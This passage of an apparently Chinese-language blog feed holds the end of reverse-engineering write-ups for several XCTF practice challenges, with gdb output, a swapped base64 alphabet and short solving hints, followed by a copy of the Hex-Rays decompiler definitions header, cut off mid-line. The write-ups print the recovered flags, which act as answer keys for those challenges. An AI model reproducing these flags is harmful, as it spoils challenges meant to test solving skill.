class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4952dd:mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x4952e1:mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x4952e6:mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">=&gt; 0x4952eb:call   0x47e620</span><br><span class="line">   0x4952f0:mov    rax,QWORD PTR [rsp+0x38]</span><br><span class="line">   0x4952f5:mov    rcx,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x4952fa:mov    rdx,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x4952ff:mov    rbx,QWORD PTR [rsp+0x20]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xc000070e90 --&gt; 0xc000074580 ("6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345", '\377' &lt;repeats 45 times&gt;, "\005\377\377:;&lt;=&gt;?")</span><br><span class="line">0008| 0xc000070e98 --&gt; 0xc000088040 ("tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3")</span><br><span class="line">0016| 0xc000070ea0 --&gt; 0x38 ('8')</span><br><span class="line">0024| 0xc000070ea8 --&gt; 0x40 ('@')</span><br><span class="line">0032| 0xc000070eb0 --&gt; 0xc000088040 ("tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3")</span><br><span class="line">0040| 0xc000070eb8 --&gt; 0x38 ('8')</span><br><span class="line">0048| 0xc000070ec0 --&gt; 0x1 </span><br><span class="line">0056| 0xc000070ec8 --&gt; 0x1 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Thread 1 "easyGo" hit Breakpoint 3, 0x00000000004952eb in ?? ()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>找到字母表和密文，解密得到flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">92094</span>daf-<span class="hljs-number">33</span>c<span class="hljs-number">9</span>-<span class="hljs-number">431</span>e-a<span class="hljs-number">85</span>a-<span class="hljs-number">8</span>bfbd<span class="hljs-number">5</span>df<span class="hljs-number">98</span>ad}</span><br></pre></td></tr></tbody></table></figure><h4 id="easyCpp"><a href="#easyCpp" class="headerlink" title="easyCpp"></a>easyCpp</h4><p>这题有很多c++标准库的调用，整体来说不是很难，可以通过调试发现每一部分的作用，也不是很难</p><h4 id="re5-packed-movement"><a href="#re5-packed-movement" class="headerlink" title="re5-packed-movement"></a>re5-packed-movement</h4><p>极其无聊的一道题，硬生生用<code>mov</code>实现了所有操作，要求输入<code>flag</code>对比一下，直接<code>objdump</code>就能再汇编代码里找到逐字符将flag移入到某个地址，或者因为是逐字符验证，直接<code>pintools</code>爆破也可以</p><h4 id="the-maya-society"><a href="#the-maya-society" class="headerlink" title="the_maya_society"></a>the_maya_society</h4><p>大致意思就是对当前时间进行一个<code>md5</code>加密，然后和一个字符串连接成目标网址，如果这个目标是对的后面的通信就会得到正确的flag……</p><p>时间应该是2012-12-21</p><h4 id="2ex1"><a href="#2ex1" class="headerlink" title="2ex1"></a>2ex1</h4><p><code>mips</code>，并且<code>strip</code>过，什么信息都没有，打开输出发现很像<code>base64</code>，但应该换过表，<code>ghidra</code>打开找找可疑字符串，发现奇怪的字符串</p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@,<span class="hljs-string">.1fgvw</span><span class="hljs-comment">#`/2ehux$~"3dity%_;4cjsz^+{5bkrA&amp;=}6alqB*-[70mpC()]89noD</span></span><br></pre></td></tr></tbody></table></figure><p>试一试就得到了flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{change<span class="hljs-number">53233</span>}</span><br></pre></td></tr></tbody></table></figure><p>对这个字符串表进行交叉引用查询到话也可以找到进行<code>base64</code>编码的函数</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA常用宏定义</title>
      <link href="/2020/03/10/IDA%E5%B8%B8%E7%94%A8%E5%AE%8F%E5%AE%9A%E4%B9%89/"/>
      <url>/2020/03/10/IDA%E5%B8%B8%E7%94%A8%E5%AE%8F%E5%AE%9A%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>保存一下便于查询。</p><span id="more"></span><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">   This file contains definitions used by the Hex-Rays decompiler output.</span></span><br><span class="line"><span class="hljs-comment">   It has type definitions and convenience macros to make the</span></span><br><span class="line"><span class="hljs-comment">   output more readable.</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">   Copyright (c) 2007-2011 Hex-Rays</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined(__GNUC__)</span></span><br><span class="line">  <span class="hljs-keyword">typedef</span>          <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ll;</span><br><span class="line">  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ull;</span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __int64 long long</span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __int32 int</span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __int16 short</span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __int8  char</span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAKELL(num) num ## LL</span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FMT_64 <span class="hljs-meta-string">"ll"</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> defined(_MSC_VER)</span></span><br><span class="line">  <span class="hljs-keyword">typedef</span>          __int64 ll;</span><br><span class="line">  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> __int64 ull;</span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAKELL(num) num ## i64</span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FMT_64 <span class="hljs-meta-string">"I64"</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> defined (__BORLANDC__)</span></span><br><span class="line">  <span class="hljs-keyword">typedef</span>          __int64 ll;</span><br><span class="line">  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> __int64 ull;</span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAKELL(num) num ## i64</span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FMT_64 <span class="hljs-meta-string">"L"</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span></span><br><span class="line">  <span class="hljs-meta">#<span class="hljs-meta-keyword">error</span> <span class="hljs-meta-string">"unknown compiler"</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> uint;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> uchar;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> ushort;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> ulong;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">typedef</span>          <span class="hljs-keyword">char</span>   int8;</span><br><span class="line"><span class="hljs-keyword">typedef</span>   <span class="hljs-keyword">signed</span> <span class="hljs-keyword">char</span>   sint8;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>   uint8;</span><br><span class="line"><span class="hljs-keyword">typedef</span>          <span class="hljs-keyword">short</span>  int16;</span><br><span class="line"><span class="hljs-keyword">typedef</span>   <span class="hljs-keyword">signed</span> <span class="hljs-keyword">short</span>  sint16;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>  uint16;</span><br><span class="line"><span class="hljs-keyword">typedef</span>          <span class="hljs-keyword">int</span>    int32;</span><br><span class="line"><span class="hljs-keyword">typedef</span>   <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>    sint32;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>    uint32;</span><br><span class="line"><span class="hljs-keyword">typedef</span> ll              int64;</span><br><span class="line"><span class="hljs-keyword">typedef</span> ll              sint64;</span><br><span class="line"><span class="hljs-keyword">typedef</span> ull             uint64;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Partially defined types:</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _BYTE  uint8</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _WORD  uint16</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _DWORD uint32</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _QWORD uint64</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> !defined(_MSC_VER)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _LONGLONG __int128</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _WINDOWS_</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> int8 BYTE;</span><br><span class="line"><span class="hljs-keyword">typedef</span> int16 WORD;</span><br><span class="line"><span class="hljs-keyword">typedef</span> int32 DWORD;</span><br><span class="line"><span class="hljs-keyword">typedef</span> int32 LONG;</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"><span class="hljs-keyword">typedef</span> int64 QWORD;</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> __cplusplus</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> <span class="hljs-keyword">bool</span>;       <span class="hljs-comment">// we want to use bool in our C programs</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Some convenience macros to make partial accesses nicer</span></span><br><span class="line"><span class="hljs-comment">// first unsigned macros:</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOBYTE(x)   (*((_BYTE*)&amp;(x)))   <span class="hljs-comment">// low byte</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOWORD(x)   (*((_WORD*)&amp;(x)))   <span class="hljs-comment">// low word</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LODWORD(x)  (*((_DWORD*)&amp;(x)))  <span class="hljs-comment">// low dword</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HIBYTE(x)   (*((_BYTE*)&amp;(x)+1))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HIWORD(x)   (*((_WORD*)&amp;(x)+1))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HIDWORD(x)  (*((_DWORD*)&amp;(x)+1))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORDn(x, n)   (*((_WORD*)&amp;(x)+n))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE1(x)   BYTEn(x,  1)         <span class="hljs-comment">// byte 1 (counting from 0)</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE2(x)   BYTEn(x,  2)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE3(x)   BYTEn(x,  3)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE4(x)   BYTEn(x,  4)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE5(x)   BYTEn(x,  5)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE6(x)   BYTEn(x,  6)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE7(x)   BYTEn(x,  7)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE8(x)   BYTEn(x,  8)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE9(x)   BYTEn(x,  9)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE10(x)  BYTEn(x, 10)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE11(x)  BYTEn(x, 11)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE12(x)  BYTEn(x, 12)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE13(x)  BYTEn(x, 13)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE14(x)  BYTEn(x, 14)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE15(x)  BYTEn(x, 15)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORD1(x)   WORDn(x,  1)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORD2(x)   WORDn(x,  2)         <span class="hljs-comment">// third word of the object, unsigned</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORD3(x)   WORDn(x,  3)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORD4(x)   WORDn(x,  4)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORD5(x)   WORDn(x,  5)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORD6(x)   WORDn(x,  6)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WORD7(x)   WORDn(x,  7)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// now signed macros (the same but with sign extension)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLOBYTE(x)   (*((int8*)&amp;(x)))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLOWORD(x)   (*((int16*)&amp;(x)))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLODWORD(x)  (*((int32*)&amp;(x)))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SHIBYTE(x)   (*((int8*)&amp;(x)+1))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SHIWORD(x)   (*((int16*)&amp;(x)+1))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SHIDWORD(x)  (*((int32*)&amp;(x)+1))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORDn(x, n)   (*((int16*)&amp;(x)+n))</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE2(x)   SBYTEn(x,  2)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE3(x)   SBYTEn(x,  3)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE4(x)   SBYTEn(x,  4)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE5(x)   SBYTEn(x,  5)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE6(x)   SBYTEn(x,  6)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE7(x)   SBYTEn(x,  7)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE8(x)   SBYTEn(x,  8)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE9(x)   SBYTEn(x,  9)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE10(x)  SBYTEn(x, 10)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE11(x)  SBYTEn(x, 11)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE12(x)  SBYTEn(x, 12)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE13(x)  SBYTEn(x, 13)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE14(x)  SBYTEn(x, 14)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SBYTE15(x)  SBYTEn(x, 15)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORD1(x)   SWORDn(x,  1)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORD2(x)   SWORDn(x,  2)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORD3(x)   SWORDn(x,  3)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORD4(x)   SWORDn(x,  4)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORD5(x)   SWORDn(x,  5)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORD6(x)   SWORDn(x,  6)</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWORD7(x)   SWORDn(x,  7)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Helper functions to represent some assembly instructions.</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Fill memory block with an integer value</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">memset32</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr, uint32 value, <span class="hljs-keyword">int</span> count)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  uint32 *p = (uint32 *)ptr;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i &lt; count; i++ )</span><br><span class="line">    *p++ = value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Generate a reference to pair of operands</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span>  int16 __PAIR__( int8  high, T low) { <span class="hljs-keyword">return</span> ((( int16)high) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(high)*<span class="hljs-number">8</span>) | <span class="hljs-built_in">uint8</span>(low); }</span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span>  int32 __PAIR__( int16 high, T low) { <span class="hljs-keyword">return</span> ((( int32)high) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(high)*<span class="hljs-number">8</span>) | <span class="hljs-built_in">uint16</span>(low); }</span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span>  int64 __PAIR__( int32 high, T low) { <span class="hljs-keyword">return</span> ((( int64)high) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(high)*<span class="hljs-number">8</span>) | <span class="hljs-built_in">uint32</span>(low); }</span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> uint16 __PAIR__(uint8  high, T low) { <span class="hljs-keyword">return</span> (((uint16)high) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(high)*<span class="hljs-number">8</span>) | <span class="hljs-built_in">uint8</span>(low); }</span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> uint32 __PAIR__(uint16 high, T low) { <span class="hljs-keyword">return</span> (((uint32)high) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(high)*<span class="hljs-number">8</span>) | <span class="hljs-built_in">uint16</span>(low); }</span><br><span class="line"><span 